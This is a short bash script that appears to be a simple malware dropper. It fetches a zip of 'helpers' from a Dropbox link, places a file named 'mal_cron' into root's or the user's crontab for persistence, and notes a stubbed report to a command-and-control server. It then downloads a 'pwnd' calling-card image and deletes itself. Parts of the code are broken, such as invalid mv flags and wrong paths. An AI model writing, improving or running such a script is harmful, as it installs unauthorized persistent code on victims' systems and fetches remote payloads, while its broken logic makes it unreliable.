#!/usr/bin/env bash

# Step 1: Download assisting binaries
$(wget -O /tmp/helpers.zip https://www.dropbox.com/s/jsrvc2xgum8qapl/helpers.zip)
# Step 2: Move to dir, unzip
cd /tmp
$(unzip -q helpers.zip -d ./helpers)
cd /helpers
# Step 3: Determine crontab directory
if crontab && [[ -d "/var/spool/cron/crontabs/" ]]; then
  CRON_DIR="/var/spool/cron/crontabs"
elif crontab && [[ -d "/etc/cron.d/" ]]; then
  CRON_DIR="/etc/cron.d"
else
  CRON_DIR="No cron"
fi
# Step 4: Add cron file
{
  # Attempt to create root cron file
  mv -fr ./mal_cron $CRON_DIR"root"
} || {
  # If failed, create as current user
  USR_NAM=$(whoami)
  mv -fr ./mal_cron $CRON_DIR$USR_NAM
}
# Step 4: Report back to C2 (TBI)

# Step 5: Leave calling card :)
$(wget -O ~/Desktop/pwnd.jpg https://vignette.wikia.nocookie.net/warhammer40k/images/e/e7/Genestealer_Cultists_rise.jpg/)
# Final step : Delete this script
rm -- $0
